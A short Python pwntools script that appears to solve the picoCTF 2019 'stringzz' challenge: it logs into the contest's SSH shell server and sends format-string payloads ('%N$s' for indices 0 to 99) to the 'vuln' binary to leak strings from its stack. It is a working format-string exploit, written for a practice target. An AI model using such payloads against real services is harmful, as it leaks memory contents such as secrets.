from pwn import *
import time

binary = "./stringzz"
#
#p = process(binary)
#
passwd = input().rstrip()
s = ssh(host="2019shell1.picoctf.com", user="tiki", password=passwd)


for i in range(100):
    #p = process(binary)
    p = s.process("vuln",cwd="/problems/stringzz_4_a95d63468fc56e11a9e406b68c4b3a4a")
    print("index:{}".format(i))
    payload=b"%%%d$s" % i
    print(payload)
    p.sendlineafter(b"back:\n\n",payload)
    p.recvuntil("printed:\n\n")
    try:
        res=p.recv()
        print(res)
    except:
        pass